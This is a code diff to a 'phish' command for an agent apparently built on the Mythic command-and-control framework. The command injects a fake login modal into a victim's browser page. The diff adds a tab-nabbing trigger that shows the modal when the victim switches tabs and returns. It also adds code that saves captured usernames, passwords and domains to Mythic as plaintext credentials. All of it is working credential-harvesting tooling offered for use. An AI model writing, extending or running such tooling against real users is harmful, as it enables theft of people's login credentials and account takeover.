@@ -1,5 +1,6 @@
 from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
+import json
 
 
 class PhishArguments(TaskArguments):
@@ -24,6 +25,16 @@ class PhishArguments(TaskArguments):
                 default_value="Your session has timed out. Please sign in again to continue.",
                 description="Modal subtitle/description text",
             ),
+            CommandParameter(
+                name="trigger",
+                type=ParameterType.ChooseOne,
+                choices=["immediate", "tab_switch"],
+                parameter_group_info=[ParameterGroupInfo(
+                    required=False
+                )],
+                default_value="immediate",
+                description="When to show the modal: immediately or when user switches tabs and returns (tab nabbing)",
+            ),
         ]
 
     async def parse_arguments(self):
@@ -41,8 +52,8 @@ class PhishCommand(CommandBase):
     cmd = "phish"
     needs_admin = False
     help_cmd = "phish"
-    description = "Inject a fake 'session expired' login modal over the page. Captures credentials when the victim submits the form. Customizable title and subtitle."
-    version = 1
+    description = "Inject a fake login modal over the page. Captures credentials when submitted. Supports immediate display or tab-nabbing (shows on tab return). Captured credentials are auto-stored in Mythic."
+    version = 2
     author = "@grampae"
     attackmapping = ["T1056.002"]
     argument_class = PhishArguments
@@ -52,9 +63,31 @@ class PhishCommand(CommandBase):
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
         title = task.args.get_arg("title") or "Session Expired"
-        task.display_params = '"{}"'.format(title)
+        trigger = task.args.get_arg("trigger") or "immediate"
+        task.display_params = '"{}" ({})'.format(title, trigger)
         return task
 
     async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
         resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
+
+        # Auto-store captured credentials in Mythic
+        try:
+            data = json.loads(response)
+            if data.get("username") or data.get("password"):
+                await SendMythicRPCCredentialCreate(MythicRPCCredentialCreateMessage(
+                    TaskID=task.Task.ID,
+                    Credentials=[MythicRPCCredentialData(
+                        credential_type="plaintext",
+                        realm=data.get("domain", ""),
+                        account=data.get("username", ""),
+                        credential=data.get("password", ""),
+                        comment="Phished via tyche on {} ({})".format(
+                            data.get("url", ""),
+                            data.get("capturedAt", "")
+                        )
+                    )]
+                ))
+        except Exception:
+            pass
+
         return resp
